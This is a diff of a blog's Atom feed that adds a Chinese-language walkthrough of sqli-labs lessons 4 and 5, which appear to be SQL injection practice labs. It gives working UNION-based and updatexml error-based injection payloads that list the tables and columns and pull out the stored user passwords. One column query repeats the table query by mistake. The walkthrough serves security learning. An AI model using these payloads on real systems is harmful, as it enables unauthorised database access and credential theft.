@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-03-24T15:32:34.046Z</updated>
+  <updated>2022-03-31T07:15:10.210Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="http://example.com/2022/03/31/less4-20/"/>
+    <id>http://example.com/2022/03/31/less4-20/</id>
+    <published>2022-03-31T07:16:45.131Z</published>
+    <updated>2022-03-31T07:15:10.210Z</updated>
+    
+    <content type="html"><![CDATA[<hr><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><h2 id="less-4"><a href="#less-4" class="headerlink" title="less 4"></a>less 4</h2><p>第四关里通过报错可以发现 id&#x3D;1，id&#x3D;1‘，id&#x3D;1’） 都可以出现正确结果，然而当我们输入id&#x3D;1“时候出现了报错 </p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less4-1.png" alt="图片"></p><p>根据报错我们分析一下错误内容  </p><p>‘“1”“） limit 0，1’</p><p>减去‘’部分我们可以获得 “1“”）这个信息 那么就可以得知我们的sql语言是  select from where id&#x3D;（”id“）这样的信息，那么我们输入id&#x3D;1”)加上–+来忽略后面的”）并且插入我们的查询代码，继续用union查询来查询</p><p>先查库名 先让id值等于一个不可能的数字-1 执行后面的语句  id&#x3D;-1“）union select 1,2,database() –+</p><p>再查询表名字 ?id&#x3D;-1”) union select 1,2, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’ –+</p><p>再查询 所要找的表里面的列 ?id&#x3D;-1”) union select 1,2, group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+</p><p>得到了有三个列 分别是 id admin password 查询账号密码  ?id&#x3D;-1”) union select 1,2, group_concat(password）from security.users –+  最终得到结果，不再进行演示，毕竟这个问题的难点全在一开始对于错误的解释 需要我们分析出来争取的sql查询语句 </p><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>第五题 刚开始就是这个样子 说明使用盲注入或者报错注入了，由于手工注入的不方便性，这次使用报错注入。</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-1.png"></p><p>这边就要提到 updatexml()这个函数了，其本意就是一个更新xml的函数，具体的格式是updatexml(目标xml内容，xml文档路径，更新的内容)</p><p>其中xml内容无关紧要，我们用1来代替 路径我们用一个子查询来报错引出我们所需要的东西，用concat来拼接（0x7e，子查询，0x7e），而更新的内容也不是什么重要的内容，报错注入主要是想让sql数据库来在一些重要的错误时爆出对哦我们有用的消息</p><p>先用之前学过的判断id的类型 再用updatexml来进行报错注入</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-3.png"></p><p>从而得到库名 security  </p><p>而查表的时候，内容与之前联合查询差不多，唯独加上了limit 的限制 因为他限制只有一行，所以我们从limit 0，1 一直实验到我们所需要的名上 </p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+ 查到users表</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-4.png"></p><p>继续查找列表</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e),1) –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-5.png"></p><p>找到密码，但需要一个个的看</p><p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1) –+</p><p><img src="https://raw.githubusercontent.com/TJ-deng/helloworld/master/less4-5/less5-6.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;hr&gt;
+&lt;h2 id=&quot;hello&quot;&gt;&lt;a href=&quot;#hello&quot; class=&quot;headerlink&quot; title=&quot;hello&quot;&gt;&lt;/a&gt;hello&lt;/h2&gt;&lt;h2 id=&quot;less-4&quot;&gt;&lt;a href=&quot;#less-4&quot; class=&quot;headerlink&quot; tit</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title></title>
